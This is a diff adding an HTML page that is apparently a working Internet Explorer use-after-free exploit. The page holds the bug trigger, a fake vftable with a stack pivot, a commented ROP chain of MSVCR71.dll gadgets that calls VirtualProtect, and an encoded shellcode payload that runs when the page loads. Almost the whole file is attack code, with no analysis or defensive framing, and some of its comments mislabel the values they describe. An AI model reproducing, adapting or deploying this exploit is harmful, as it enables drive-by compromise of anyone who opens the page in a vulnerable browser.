@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en" XMLNS:t=""urn:schemas-microsoft-com:time">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta>
+        <?IMPORT namespace="t" implementation="#default#time2">
+    </meta>
+    <title></title>
+</head>
+<body>
+    <!--this element is where the pointers are assigned-->
+    <t:ANIMATECOLOR id="myfill" />
+</body>
+<script>
+
+    // this sets up our fake vftable with the address 0x13371337 as the function at offset +0x70
+    // it also serves as a nop sled in the rop chain leading to the main rop chain below
+    fill = "\u1094\u7c34";
+
+    for (i = 0; i < 0x70 / 4; i++) {
+        if (i === 0x68 / 4 - 1) {
+            fill += unescape("\u4af7\u7c34");       // retn 0x0004 ;        - 'jumps' over the stack pivot
+        } else if (i === 0x70 / 4 - 1) {
+            fill += unescape("\u49e6\u756e");       // mov esp, eax ; ret ; - UaF stack pivot
+        } else {
+            fill += unescape("\u1094\u7c34");       // ret ;                - ROP nops
+        }
+    }
+
+    // main ROP chain
+    // get a reference to the stack
+    fill += "\u58e6\u7c34";                         // pop edx ; ret ;
+    fill += "\uce38\u7c38";                         // writable location in MSVCR71.dll
+    fill += "\u2f4f\u7c37";                         // push esp ; and al, 0x10 ; mov dword [edx], ecx ; pop esi ; ret ;
+                                                    // we have a reference to the stack in esi
+
+    // Place the address for VirtualProtectStub on the stack
+    // -------------------------------------------------------------------------------------------------------------------------------
+    // deref the IAT address for VirtualProtect
+    fill += "\u626b\u7c37";                         // pop eax ; ret ;
+    fill += "\ua140\u7c37";                         // IAT address for VirtualProtect
+    fill += "\u30ea\u7c35";                         // mov eax, dword [eax] ; ret ;
+                                                    // eax now holds the address of VirtualProtectStub
+
+    // use cop to move eax into ecx for later
+    fill += "\u1748\u7c34";                         // pop ebx ; ret ;
+    fill += "\uc07e\u7c36";                         // pop ecx ; pop ecx ; ret ;
+    fill += "\u90b3\u7c34";                         // push eax ; call ebx ;    
+                                                    // ecx now holds the address of VirtualProtectStub
+
+    fill += "\uc473\u7c34";                         // xor eax, eax ; ret ;
+    fill += "\u373b\u7c36";                         // add eax, esi ; pop esi ; ret ;
+    fill += "\uaaaa\u7aaa";                         // 0x7aaaaaaa
+    fill += "\u373b\u7c36";                         // add eax, esi ; pop esi ; ret ;
+    fill += "\u56fa\u8555";                         // 0x855556fa (effectively add 0x1a4 to eax) - 0x85555556 + 0x1a4
+    fill += "\u373b\u7c36";                         // add eax, esi ; pop esi ; ret ;
+    fill += "\uaaaa\uaaaa";                         // junk in esi
+                                                    // eax points to the placeholder
+                                                    // esi has junk in it
+                                                    // ecx points to VirtualProtectStub
+
+    // write VirtualProtectStub to the stack/placeholder
+    fill += "\u300b\u7c37";                         // mov dword [eax], ecx ; pop esi ; ret ;
+    fill += "\uaaaa\uaaaa";                         // junk in esi
+
+    // Place the address for our shellcode on the stack
+    // -------------------------------------------------------------------------------------------------------------------------------
+    // increment eax by 24 to shellcode (0x0c + 0x0c = 0x18 [20])
+    fill += "\ue75d\u7c34";                         // inc eax, 0x0c ; ret ;
+    fill += "\ue75d\u7c34";                         // inc eax, 0x0c ; ret ;
+    
+    // use cop to move eax into ecx
+    fill += "\u1748\u7c34";                         // pop ebx ; ret ;
+    fill += "\uc07e\u7c36";                         // pop ecx ; pop ecx ; ret ;
+    fill += "\u90b3\u7c34";                         // push eax ; call ebx ;    
+                                                    // ecx now holds the address of the shellcode
+    
+    // reallign eax to the correct placeholder - subtract 20 (0x20 - 0x0c = 0x14 [20])
+    fill += "\u54e3\u7c35";                         // sub eax, 0x20 ; ret ;
+    fill += "\u9ede\u7c34";                         // add eax, 0x0c ; ret ;
+                                                    // eax points to the placeholder
+                                                    // esi has junk in it
+                                                    // ecx contains the location of the shellcode
+
+    // write shellcode address to the stack/placeholder
+    fill += "\u300b\u7c37";                         // mov dword [eax], ecx ; pop esi ; ret ;
+    fill += "\uaaaa\uaaaa";                         // junk in esi
+
+    // Place the lpAddress parameter on the stack
+    // -------------------------------------------------------------------------------------------------------------------------------
+    // increment eax by 4 to lpAddress
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+
+    // write shellcode address to the stack/placeholder
+    fill += "\u300b\u7c37";                         // mov dword [eax], ecx ; pop esi ; ret ;
+    fill += "\uaaaa\uaaaa";                         // junk in esi
+
+    // Place the dwSize parameter on the stack (0x1000)
+    // -------------------------------------------------------------------------------------------------------------------------------
+    // temp store eax in ebx (ref to stack)
+    fill += "\u1748\u7c34";                         // pop ebx ; ret ;
+    fill += "\u5192\u7c34";                         // pop ecx ; pop ebx ; pop eax ; ret ;
+    fill += "\u90b3\u7c34";                         // push eax ; call ebx ;
+    fill += "\uaaaa\uaaaa";                         // junk   
+                                                    // ebx now holds the reference to the stack
+
+    // get 0x1000 in eax
+    fill += "\uf0ee\u7c35";                         // xor esi, esi ; mov eax, esi ; pop esi ; ret ;
+    fill += "\uaaaa\u7aaa";                         // 0x7aaaaaaa
+    fill += "\u373b\u7c36";                         // add eax, esi ; pop esi ; ret ;
+    fill += "\u6556\u8555";                         // 0x85556556 (effectively add 0x1000 to eax) - 0x85555556 + 0x1000
+    fill += "\u373b\u7c36";                         // add eax, esi ; pop esi ; ret ;
+    fill += "\uaaaa\uaaaa";                         // junk in esi
+                                                    // eax contains 0x1000
+
+    // use cop to move eax into ecx for later
+    fill += "\u1123\u7c34";                         // pop edi ; ret ;
+    fill += "\uc07e\u7c36";                         // pop ecx ; pop ecx ; ret ;
+    fill += "\u2537\u7c36";                         // push eax ; call edi ;    
+                                                    // ecx now holds 0x1000
+    // mov ebx back in to eax
+    fill += "\uf6c2\u7c34";                         // mov eax, ebx ; pop ebx ; ret ;
+    fill += "\uaaaa\uaaaa";                         // junk in ebx
+
+    // increment eax by 4 to dwSize
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+
+    // write dwSize to the stack/placeholder
+    fill += "\u300b\u7c37";                         // mov dword [eax], ecx ; pop esi ; ret ;
+    fill += "\uaaaa\uaaaa";                         // junk in esi
+
+    // Place the flNewProtect parameter on the stack (0x40)
+    // -------------------------------------------------------------------------------------------------------------------------------
+    // temp store eax in ebx (ref to stack)
+    fill += "\u1748\u7c34";                         // pop ebx ; ret ;
+    fill += "\u5192\u7c34";                         // pop ecx ; pop ebx ; pop eax ; ret ;
+    fill += "\u90b3\u7c34";                         // push eax ; call ebx ;
+    fill += "\uaaaa\uaaaa";                         // junk   
+                                                    // ebx now holds the reference to the stack
+
+    // get 0x40 in eax
+    fill += "\uf0ee\u7c35";                         // xor esi, esi ; mov eax, esi ; pop esi ; ret ;
+    fill += "\uaaaa\u7aaa";                         // 0x7aaaaaaa
+    fill += "\u373b\u7c36";                         // add eax, esi ; pop esi ; ret ;
+    fill += "\u5596\u8555";                         // 0x85555596 (effectively add 0x40 to eax) - 0x85555556 + 0x40
+    fill += "\u373b\u7c36";                         // add eax, esi ; pop esi ; ret ;
+    fill += "\uaaaa\uaaaa";                         // junk in esi
+                                                    // eax contains 0x1000
+
+    // use cop to move eax into ecx for later
+    fill += "\u1123\u7c34";                         // pop edi ; ret ;
+    fill += "\uc07e\u7c36";                         // pop ecx ; pop ecx ; ret ;
+    fill += "\u2537\u7c36";                         // push eax ; call edi ;    
+                                                    // ecx now holds 0x1000
+    // mov ebx back in to eax
+    fill += "\uf6c2\u7c34";                         // mov eax, ebx ; pop ebx ; ret ;
+    fill += "\uaaaa\uaaaa";                         // junk in ebx
+
+    // increment eax by 4 to dwSize
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+    fill += "\u845b\u7c34";                         // inc eax ; ret ;
+
+    // write dwSize to the stack/placeholderP
+    fill += "\u300b\u7c37";                         // mov dword [eax], ecx ; pop esi ; ret ;
+    fill += "\uaaaa\uaaaa";                         // junk in esi
+
+    // change to int3 to debug
+    fill += "\u1094\u7c34";                        // rop nop
+
+    // padding - will be correctly calculated at the end
+    for (i = 0; i < 0x20; i++) {
+        fill += "\u1094\u7c34";
+    }
+
+    // VirtualProtect call placeholder - can be deleted later
+    fill += "\u4141\u4141";                         // address of VirtualProtect
+    fill += "\u4242\u4242";                         // saved return address -  the address of our shellcode
+    fill += "\u4343\u4343";                         // lpAddress, also the address of our shellcode
+    fill += "\u4444\u4444";                         // dwSize - 0x1000
+    fill += "\u4545\u4545";                         // flNewProtect - PAGE_EXECUTE_READWRITE (0x40)
+    fill += "\uce38\u7c38";                         // flOldProtect - writable location in MSVCR71.dll             
+
+    // shellcode goes here
+    //
+    fill += "\u9090\u9090";
+    fill += "\u9090\u9090";
+    fill += "\u9090\u9090";
+    fill += "\u9090\u9090";
+    
+    shellcode = unescape("%u91be%u1e9e%udbac%ud9d5%u2474%u5df4%uc933%u52b1%u7531%u8312%u04c5%ue403%ufc90%ufa59%u8245%u02a2%ue396%ue72b%u23a7%u6c4f%u9397%u201b%u5f14%ud049%u2daf%ud746%u9b18%ud6b0%ub099%u7981%ucb1a%u59d5%u0423%u9828%u7964%uc8c1%uf53d%ufc74%u434a%u7745%u4500%u64cd%u64d1%u3bfc%u3f69%ubade%u4bbe%ua457%u76a3%u5f21%u0c17%u89b0%ued69%uf41f%u1c45%u3161%uff61%u4b14%u8291%u882e%u58eb%u0aba%u2a4b%uf61c%uff6d%u7dfb%ub461%ud988%u4b66%u525c%uc092%ub463%u9212%u1047%u407e%u01e9%u27da%u5116%u9885%u1ab2%ucc28%u41ce%u2125%u79e3%u2db5%u0a74%uf287%u842e%u7bab%u53e9%u51cb%ucb4d%u5a32%uc2ae%u0ef0%u7cfe%u2ed0%u7c95%ufadd%u2c3a%u5571%u9cfb%u0531%uf693%u7abd%uf983%u1317%u002e%udcf0%u0b07%ub537%u0b55%u1926%uedd3%ub122%ua6b5%u28da%u3c9c%ub47a%u390a%u3ebc%ubeb9%ub773%uacb4%u37e4%u8e83%u48a3%ua639%uda28%u36a6%uc726%u6170%u396f%ue789%u609d%u1523%uf45c%u9d0c%uc5bb%u1c93%u7149%u0eb0%u7a97%u7afc%u2d47%ud4aa%u8721%u8e1c%u74fb%u46f7%ub77d%u10c8%u9282%ufcbe%u4b33%u0387%u1bfb%u7c0f%ubbe1%u57f0%ucca1%uf5ba%u4480%u6c63%u0891%u5b94%u34d6%u6917%uc2a7%u1807%u8fa2%uf18f%u80de%uf565%ua04d%u41af");
+
+    fill += shellcode;
+
+    // set up the rest of the pointers - 14 in total (14x4 = 0x38)
+    // we specify 14 to fill the freed allocation
+    for (i = 0; i < 13; i++) {
+        fill += ";fill";
+    }
+
+    // the bug trigger code
+    f0 = document.createElement('span');
+    document.body.appendChild(f0);
+    f1 = document.createElement('span');
+    document.body.appendChild(f1);
+    f2 = document.createElement('span');
+    document.body.appendChild(f2);
+    document.body.contentEditable = "true";
+    f2.appendChild(document.createElement('datalist'));
+    f1.appendChild(document.createElement('span'));
+    f1.appendChild(document.createElement('table'));
+    try {
+        f0.offsetParent = null;
+    } catch (e) { 
+        f2.innerHTML = "";
+        f0.appendChild(document.createElement('hr'));
+        f1.innerHTML = "";
+        CollectGarbage();
+
+        // when fill is assigned to myfill.values the heap manager using LOFI
+        // allocates pointers in the freed space
+        // the first of these is a pointer to our fake vftable
+        a = document.getElementById('myfill');
+        a.values = fill;
+    }
+</script>
+</html>
